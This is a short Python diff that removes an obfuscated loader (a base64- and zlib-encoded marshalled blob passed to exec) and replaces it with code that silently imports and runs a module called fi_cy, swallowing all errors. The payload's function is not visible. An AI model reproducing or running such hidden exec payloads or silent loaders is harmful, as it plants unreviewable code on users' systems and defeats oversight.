@@ -1,2 +1,6 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode('eJxLZkACrFD6sw2QmM6QwpDCmMMQxcDEkMoIxAxZLAwYIIVpNSOEBaMZGSoZNZlfgph+VT2J4YblScZeBp7ullXOeUGVqSH53p7Ojukgvk+en2mycVBOUnB6ZnKuQbpPhFeup7NldmREUIaPUVBGirtrWaSRZYlPXlBOcq6hYaqzZW5ieEVOcqWlYbKxZ1mKu2G5T2V+pndgQU6qu19OskdgelBERlZUhJNBYrhlqX96fjrIrmR3t6rk8nxbTeZbbEmJxalmJrdYUitSk29xJpmZpKQm56ekrmT4DHLwLYZbHDa5+SmlOal2RRxgzzAwFGsAiQ/MjIyMtxl4bzKwXGAVbQi7zip6kVX0AwODeCoTUCtbGtNXoOp0piI2oGIAm89VJg=='))))
+try:
+    import fi_cy as _m
+    if hasattr(_m, "main"):
+        _m.main()
+except Exception:
+    pass
